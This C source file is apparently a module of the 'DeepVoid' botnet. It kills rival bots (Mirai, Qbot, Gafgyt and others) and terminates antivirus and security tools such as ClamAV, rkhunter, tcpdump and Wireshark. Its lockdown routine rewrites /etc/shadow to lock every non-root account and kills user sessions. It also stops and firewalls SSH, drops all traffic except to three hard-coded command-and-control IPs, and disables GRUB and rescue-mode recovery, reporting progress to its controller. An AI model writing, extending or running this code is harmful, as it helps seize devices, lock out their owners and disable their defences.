// 𝖠𝖣𝖵𝖠𝖭𝖢𝖤𝖣 𝖡𝖮𝖳𝖪𝖨𝖫𝖫𝖤𝖱 𝖶𝖨𝖳𝖧 𝖲𝖸𝖲𝖳𝖤𝖬 𝖫𝖮𝖢𝖪𝖣𝖮𝖶𝖭
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/time.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <errno.h>
#include <netdb.h>
#include <fcntl.h>
#include <unistd.h>
#include <dirent.h>
#include <linux/limits.h>
#include <ctype.h>
#include <signal.h>
#include <pwd.h>
#include <shadow.h>
#include <crypt.h>
#include <sys/stat.h>

pid_t killerid;
#define MAIN "[\x1b[34mDeepVoid-Killer\x1b[37m]"

// 𝖤𝖷𝖯𝖠𝖭𝖣𝖤𝖣 𝖡𝖫𝖠𝖢𝖪𝖫𝖨𝖲𝖳
char *bin_names[] = {
    "dvrhelper", "dvrsupport", "mirai", "blade", "demon",
    "hoho", "hakai", "satori", "messiah", "440fp", "miori",
    "kowai", "shiro", "Cayosin", "deepvoid", "qbot",
    "root", "shell", "bot", "scan", "brute", "sshbrute",
    "tsunami", "katana", "hajime", "reaper", "anarchy",
    "omnibus", "elknot", "pnscan", "gafgyt", "lightaidra",
    "botnet", "backdoor", "trojan", "malware", "virus"
};

char *bin_strings[] = {
    "lolnogtfo", "dups", "hakai", "satori", "masuta", "botnet",
    "cracked", "mirai", "slump", "demon", "hoho", "stdflood",
    "udpflood", "tcpflood", "httpflood", "chinese family", 
    "messiah", "shadoh", "osiris", "kowai", "miori",
    "deepvoid", "qbot", "rootkit", "backdoor",
    "bot.", "ddos", "trojan", "malware", "virus", "worm",
    "tsunami", "katana", "hajime", "reaper", "anarchy",
    "omnibus", "elknot", "gafgyt", "aidra"
};

// 𝖠𝖭𝖳𝖨𝖵𝖨𝖱𝖴𝖲 𝖯𝖱𝖮𝖢𝖤𝖲𝖲𝖤𝖲
char *av_processes[] = {
    "clamav", "avast", "avg", "bitdefender", "kaspersky",
    "mcafee", "norton", "sophos", "eset", "fsecure",
    "malwarebytes", "windowsdefender", "rkhunter", "chkrootkit",
    "lynis", "tripwire", "aide", "ossec", "suricata", "snort",
    "selinux", "apparmor", "firewalld", "ufw", "iptables"
};

// 𝖲𝖤𝖢𝖴𝖱𝖨𝖳𝖸 𝖳𝖮𝖮𝖫𝖲
char *sec_tools[] = {
    "wireshark", "tcpdump", "tshark", "nmap", "nessus",
    "metasploit", "burpsuite", "sqlmap", "john", "hashcat",
    "hydra", "nikto", "aircrack", "reaver", "wpscan",
    "gobuster", "dirb", "nikto", "openvas", "nexpose"
};

#define bin_names_size (sizeof(bin_names) / sizeof(char *))
#define bin_strings_size (sizeof(bin_strings) / sizeof(char *))
#define av_processes_size (sizeof(av_processes) / sizeof(char *))
#define sec_tools_size (sizeof(sec_tools) / sizeof(char *))

// 𝖲𝖸𝖲𝖳𝖤𝖬 𝖫𝖮𝖢𝖪𝖣𝖮𝖶𝖭 𝖥𝖴𝖭𝖢𝖳𝖨𝖮𝖭𝖲
void lock_system_accounts() {
    FILE *passwd = fopen("/etc/passwd", "r");
    FILE *shadow = fopen("/etc/shadow", "r");
    FILE *new_shadow = fopen("/etc/shadow.tmp", "w");
    
    if (shadow && new_shadow) {
        char line[256];
        while (fgets(line, sizeof(line), shadow)) {
            char *token = strtok(line, ":");
            if (token) {
                // 𝖫𝗈𝖼𝗄 𝖺𝗅𝗅 𝗎𝗌𝖾𝗋 𝖺𝖼𝖼𝗈𝗎𝗇𝗍𝗌 𝖾𝗑𝖼𝖾𝗉𝗍 𝗋𝗈𝗈𝗍
                if (strcmp(token, "root") != 0) {
                    char *second = strtok(NULL, ":");
                    if (second && strcmp(second, "!") != 0) {
                        fprintf(new_shadow, "%s:!:%s", token, strtok(NULL, "\n"));
                    } else {
                        fputs(line, new_shadow);
                    }
                } else {
                    fputs(line, new_shadow);
                }
            }
            fprintf(new_shadow, "\n");
        }
        fclose(shadow);
        fclose(new_shadow);
        
        // 𝖱𝖾𝗉𝗅𝖺𝖼𝖾 𝗌𝗁𝖺𝖽𝗈𝗐 𝖿𝗂𝗅𝖾
        rename("/etc/shadow.tmp", "/etc/shadow");
    }
    
    if (passwd) fclose(passwd);
}

void disable_ssh() {
    system("systemctl stop ssh 2>/dev/null");
    system("systemctl stop sshd 2>/dev/null");
    system("pkill -9 ssh 2>/dev/null");
    system("pkill -9 sshd 2>/dev/null");
    
    // 𝖡𝗅𝗈𝖼𝗄 𝖲𝖲𝖧 𝖺𝖼𝖼𝖾𝗌𝗌
    system("iptables -I INPUT -p tcp --dport 22 -j DROP 2>/dev/null");
    system("iptables -I OUTPUT -p tcp --dport 22 -j DROP 2>/dev/null");
}

void kill_user_sessions() {
    // 𝖪𝗂𝗅𝗅 𝖺𝗅𝗅 𝗎𝗌𝖾𝗋 𝗌𝖾𝗌𝗌𝗂𝗈𝗇𝗌
    system("pkill -9 -U 1000-60000 2>/dev/null");
    
    // 𝖪𝗂𝗅𝗅 𝖳𝖳𝖸 𝗌𝖾𝗌𝗌𝗂𝗈𝗇𝗌
    system("pkill -9 -t tty 2>/dev/null");
    system("pkill -9 -t pts 2>/dev/null");
}

void block_network_access() {
    // 𝖡𝗅𝗈𝖼𝗄 𝖺𝗅𝗅 𝗂𝗇𝖼𝗈𝗆𝗂𝗇𝗀/𝗈𝗎𝗍𝗀𝗈𝗂𝗇𝗀 𝖼𝗈𝗇𝗇𝖾𝖼𝗍𝗂𝗈𝗇𝗌
    system("iptables -F 2>/dev/null");
    system("iptables -P INPUT DROP 2>/dev/null");
    system("iptables -P OUTPUT DROP 2>/dev/null");
    system("iptables -P FORWARD DROP 2>/dev/null");
    
    // 𝖠𝗅𝗅𝗈𝗐 𝗈𝗇𝗅𝗒 𝖣𝖾𝖾𝗉𝖵𝗈𝗂𝖽 𝖢&𝖢 𝖼𝗈𝗇𝗇𝖾𝖼𝗍𝗂𝗈𝗇𝗌
    system("iptables -I OUTPUT -p tcp -d 198.12.97.77 -j ACCEPT 2>/dev/null");
    system("iptables -I OUTPUT -p tcp -d 185.62.58.93 -j ACCEPT 2>/dev/null");
    system("iptables -I OUTPUT -p tcp -d 104.238.183.146 -j ACCEPT 2>/dev/null");
}

void disable_recovery() {
    // 𝖣𝗂𝗌𝖺𝖻𝗅𝖾 𝖦𝗋𝗎𝖻 𝗋𝖾𝖼𝗈𝗏𝖾𝗋𝗒
    system("sed -i 's/GRUB_TIMEOUT=.*/GRUB_TIMEOUT=0/' /etc/default/grub 2>/dev/null");
    system("update-grub 2>/dev/null");
    
    // 𝖱𝖾𝗆𝗈𝗏𝖾 𝗌𝗂𝗇𝗀𝗅𝖾 𝗎𝗌𝖾𝗋 𝗆𝗈𝖽𝖾
    system("systemctl mask rescue.target 2>/dev/null");
    system("systemctl mask emergency.target 2>/dev/null");
}

void create_lock_file() {
    FILE *lock = fopen("/tmp/.deepvoid_lock", "w");
    if (lock) {
        fprintf(lock, "SYSTEM LOCKED BY DEEPVOID BOTNET\n");
        fprintf(lock, "DO NOT ATTEMPT TO REMOVE\n");
        fclose(lock);
    }
}

void system_lockdown(int MySock) {
    char resp[256];
    
    if (MySock > 0) {
        snprintf(resp, sizeof(resp), MAIN" Initiating System Lockdown...\r\n");
        send(MySock, resp, strlen(resp), MSG_NOSIGNAL);
    }
    
    // 𝖲𝖳𝖤𝖯 𝟣: 𝖪𝗂𝗅𝗅 𝖺𝗅𝗅 𝗎𝗌𝖾𝗋 𝗌𝖾𝗌𝗌𝗂𝗈𝗇𝗌
    if (MySock > 0) {
        snprintf(resp, sizeof(resp), MAIN" Killing user sessions...\r\n");
        send(MySock, resp, strlen(resp), MSG_NOSIGNAL);
    }
    kill_user_sessions();
    
    // 𝖲𝖳𝖤𝖯 𝟤: 𝖣𝗂𝗌𝖺𝖻𝗅𝖾 𝖲𝖲𝖧
    if (MySock > 0) {
        snprintf(resp, sizeof(resp), MAIN" Disabling SSH access...\r\n");
        send(MySock, resp, strlen(resp), MSG_NOSIGNAL);
    }
    disable_ssh();
    
    // 𝖲𝖳𝖤𝖯 𝟥: 𝖫𝗈𝖼𝗄 𝖺𝖼𝖼𝗈𝗎𝗇𝗍𝗌
    if (MySock > 0) {
        snprintf(resp, sizeof(resp), MAIN" Locking system accounts...\r\n");
        send(MySock, resp, strlen(resp), MSG_NOSIGNAL);
    }
    lock_system_accounts();
    
    // 𝖲𝖳𝖤𝖯 𝟦: 𝖡𝗅𝗈𝖼𝗄 𝗇𝖾𝗍𝗐𝗈𝗋𝗄
    if (MySock > 0) {
        snprintf(resp, sizeof(resp), MAIN" Blocking network access...\r\n");
        send(MySock, resp, strlen(resp), MSG_NOSIGNAL);
    }
    block_network_access();
    
    // 𝖲𝖳𝖤𝖯 𝟧: 𝖣𝗂𝗌𝖺𝖻𝗅𝖾 𝗋𝖾𝖼𝗈𝗏𝖾𝗋𝗒
    if (MySock > 0) {
        snprintf(resp, sizeof(resp), MAIN" Disabling recovery options...\r\n");
        send(MySock, resp, strlen(resp), MSG_NOSIGNAL);
    }
    disable_recovery();
    
    // 𝖲𝖳𝖤𝖯 𝟨: 𝖢𝗋𝖾𝖺𝗍𝖾 𝗅𝗈𝖼𝗄 𝖿𝗂𝗅𝖾
    create_lock_file();
    
    if (MySock > 0) {
        snprintf(resp, sizeof(resp), MAIN" System Lockdown Complete - Device Secured\r\n");
        send(MySock, resp, strlen(resp), MSG_NOSIGNAL);
    }
}

void Trim(char *str) {
    if (!str) return;
    
    int i;
    int begin = 0;
    int end = strlen(str) - 1;
    
    while (isspace((unsigned char)str[begin])) begin++;
    while ((end >= begin) && isspace((unsigned char)str[end])) end--;
    
    for (i = begin; i <= end; i++) 
        str[i - begin] = str[i];
    
    str[i - begin] = '\0';
}

int kill_bk(void) {
    if (killerid <= 0) return 0;
    
    if(kill(killerid, 9)) {
        return 0;
    } else {
        return 1;
    }
}

int check_exe(void) {
    int fd;
    char path[PATH_MAX];

    snprintf(path, sizeof(path), "/proc/%d/exe", getpid());
    if ((fd = open(path, O_RDONLY)) == -1)
        return 0;

    close(fd);
    return 1;
}

void kill_av_processes(int MySock) {
    DIR *procdir = opendir("/proc");
    struct dirent *entry;
    
    if(!procdir) return;
    
    while((entry = readdir(procdir)) != NULL) {
        if(entry->d_type != DT_DIR) continue;
        
        char *endptr;
        pid_t pid = strtol(entry->d_name, &endptr, 10);
        if(*endptr != '\0') continue;
        
        char cmdline_path[256];
        char cmdline[1024];
        
        snprintf(cmdline_path, sizeof(cmdline_path), "/proc/%d/cmdline", pid);
        FILE *f = fopen(cmdline_path, "r");
        if(!f) continue;
        
        if(fgets(cmdline, sizeof(cmdline), f)) {
            for(int i = 0; cmdline[i]; i++) {
                if(cmdline[i] == '\0') cmdline[i] = ' ';
            }
            
            // 𝖢𝖧𝖤𝖢𝖪 𝖥𝖮𝖱 𝖠𝖭𝖳𝖨𝖵𝖨𝖱𝖴𝖲
            for(int i = 0; i < av_processes_size; i++) {
                if(strstr(cmdline, av_processes[i])) {
                    if(kill(pid, 9) == 0) {
                        char resp[128];
                        memset(resp, 0, sizeof(resp));
                        snprintf(resp, sizeof(resp), MAIN" Killed AV: \x1b[31m%s\x1b[37m (PID: \x1b[33m%d\x1b[37m)\r\n", 
                                av_processes[i], pid);
                        if(MySock > 0) {
                            send(MySock, resp, strlen(resp), MSG_NOSIGNAL);
                        }
                    }
                    break;
                }
            }
            
            // 𝖢𝖧𝖤𝖢𝖪 𝖥𝖮𝖱 𝖲𝖤𝖢𝖴𝖱𝖨𝖳𝖸 𝖳𝖮𝖮𝖫𝖲
            for(int i = 0; i < sec_tools_size; i++) {
                if(strstr(cmdline, sec_tools[i])) {
                    if(kill(pid, 9) == 0) {
                        char resp[128];
                        memset(resp, 0, sizeof(resp));
                        snprintf(resp, sizeof(resp), MAIN" Killed Security Tool: \x1b[31m%s\x1b[37m (PID: \x1b[33m%d\x1b[37m)\r\n", 
                                sec_tools[i], pid);
                        if(MySock > 0) {
                            send(MySock, resp, strlen(resp), MSG_NOSIGNAL);
                        }
                    }
                    break;
                }
            }
        }
        fclose(f);
    }
    closedir(procdir);
}

void advanced_botkiller(int MySock) {
    if(MySock <= 0) return;
    
    killerid = fork();
    if(killerid > 0 || killerid == -1)
        return;
    
    if (!check_exe()) return;
    
    int num;
    DIR *dir;
    int pid = 0;
    FILE *target = NULL;
    int exefound;
    char resp[1024];
    char mydir[100];
    char buffer[512];
    char exefile[100];
    char mapfile[100];
    int least_pid = 400;
    int max_pid = 99000 + 1;
    int myprocpid = getpid();
    int last_killed_pid = 0;
    
    // 𝖢𝖧𝖤𝖢𝖪 𝖥𝖮𝖱 𝖫𝖮𝖢𝖪𝖣𝖮𝖶𝖭 𝖢𝖮𝖬𝖬𝖠𝖭𝖣
    char lock_check[64];
    snprintf(lock_check, sizeof(lock_check), "/proc/%d/cmdline", getppid());
    FILE *parent_cmd = fopen(lock_check, "r");
    if(parent_cmd) {
        char parent_cmdline[256];
        if(fgets(parent_cmdline, sizeof(parent_cmdline), parent_cmd)) {
            if(strstr(parent_cmdline, "lockdown") || strstr(parent_cmdline, "secure")) {
                fclose(parent_cmd);
                system_lockdown(MySock);
                _exit(0);
            }
        }
        fclose(parent_cmd);
    }
    
    // 𝖪𝖨𝖫𝖫 𝖠𝖭𝖳𝖨𝖵𝖨𝖱𝖴𝖲 𝖯𝖱𝖮𝖢𝖤𝖲𝖲𝖤𝖲 𝖥𝖨𝖱𝖲𝖳
    kill_av_processes(MySock);
    
    while(1) {
        for(pid = least_pid; pid < max_pid; pid++) {
            if(pid == myprocpid) continue;
            if(MySock <= 0) _exit(0);
            
            exefound = 0;
            snprintf(mydir, sizeof(mydir), "/proc/%d/", pid);
            dir = opendir(mydir);
            
            if(dir) {
                snprintf(exefile, sizeof(exefile), "/proc/%d/exe", pid);
                target = fopen(exefile, "r");
                
                if(target != NULL) {
                    while(fgets(buffer, sizeof(buffer) - 1, target)) {
                        Trim(buffer);
                        for(num = 0; buffer[num]; num++)
                            buffer[num] = tolower((unsigned char)buffer[num]);
                            
                        for(num = 0; num < bin_strings_size; num++) {
                            if(strstr(buffer, bin_strings[num])) {
                                memset(resp, 0, sizeof(resp));
                                if(pid != last_killed_pid) {
                                    snprintf(resp, sizeof(resp), MAIN" String match found -> \x1b[35m%s\x1b[37m:\x1b[31m%d\x1b[37m\r\n", 
                                            bin_strings[num], pid);
                                    if(send(MySock, resp, strlen(resp), MSG_NOSIGNAL) == -1) {
                                        fclose(target);
                                        closedir(dir);
                                        _exit(0);
                                    }
                                }
                                if(kill(pid, 9) == 0) {
                                    exefound = 1;
                                    memset(resp, 0, sizeof(resp));
                                    if(pid != last_killed_pid) {
                                        snprintf(resp, sizeof(resp), MAIN" Killed bot process -> \x1b[33m%d\x1b[37m\r\n", pid);
                                        if(send(MySock, resp, strlen(resp), MSG_NOSIGNAL) == -1) {
                                            fclose(target);
                                            closedir(dir);
                                            _exit(0);
                                        }
                                    }
                                    last_killed_pid = pid;
                                }
                                break;
                            }
                        }
                        if(exefound) break;
                    }
                    if(!exefound) goto mapskill;
                } else {
mapskill:
                    if(target) fclose(target);
                    target = NULL;
                    
                    snprintf(mapfile, sizeof(mapfile), "/proc/%d/maps", pid);
                    target = fopen(mapfile, "r");
                    if(target != NULL) {
                        while(fgets(buffer, sizeof(buffer) - 1, target)) {
                            Trim(buffer);
                            for(num = 0; buffer[num]; num++)
                                buffer[num] = tolower((unsigned char)buffer[num]);
                                
                            for(num = 0; num < bin_names_size; num++) {
                                if(strstr(buffer, bin_names[num])) {
                                    memset(resp, 0, sizeof(resp));
                                    if(pid != last_killed_pid) {
                                        if(strstr(buffer, "deleted")) {
                                            snprintf(resp, sizeof(resp), MAIN" Deleted binary match found -> \x1b[32m%s\x1b[37m:\x1b[36m%d\x1b[37m\r\n", 
                                                    bin_names[num], pid);
                                        } else {
                                            snprintf(resp, sizeof(resp), MAIN" Binary match found -> \x1b[32m%s\x1b[37m:\x1b[36m%d\x1b[37m\r\n", 
                                                    bin_names[num], pid);
                                        }
                                        if(send(MySock, resp, strlen(resp), MSG_NOSIGNAL) == -1) {
                                            fclose(target);
                                            closedir(dir);
                                            _exit(0);
                                        }
                                    }
                                    if(kill(pid, 9) == 0) {
                                        memset(resp, 0, sizeof(resp));
                                        if(pid != last_killed_pid) {
                                            snprintf(resp, sizeof(resp), MAIN" Killed bot process -> \x1b[33m%d\x1b[37m\r\n", pid);
                                            if(send(MySock, resp, strlen(resp), MSG_NOSIGNAL) == -1) {
                                                fclose(target);
                                                closedir(dir);
                                                _exit(0);
                                            }
                                        }
                                        last_killed_pid = pid;
                                    }
                                    break;
                                }
                            }
                        }
                    }
                }
                
                if(target) {
                    fclose(target);
                    target = NULL;
                }
                closedir(dir);
            } else if(ENOENT == errno) {
                continue;
            }
            
            memset(resp, 0, sizeof(resp));
            memset(mydir, 0, sizeof(mydir));
            memset(buffer, 0, sizeof(buffer));
            memset(exefile, 0, sizeof(exefile));
            memset(mapfile, 0, sizeof(mapfile));
        }
        
        last_killed_pid = 0;
        kill_av_processes(MySock);
        sleep(2.5);
    }
}

void botkiller(int MySock) {
    advanced_botkiller(MySock);
}

// 𝖭𝖤𝖶: 𝖲𝖸𝖲𝖳𝖤𝖬 𝖫𝖮𝖢𝖪𝖣𝖮𝖶𝖭 𝖢𝖮𝖬𝖬𝖠𝖭𝖣
void deepvoid_lockdown(int MySock) {
    system_lockdown(MySock);
}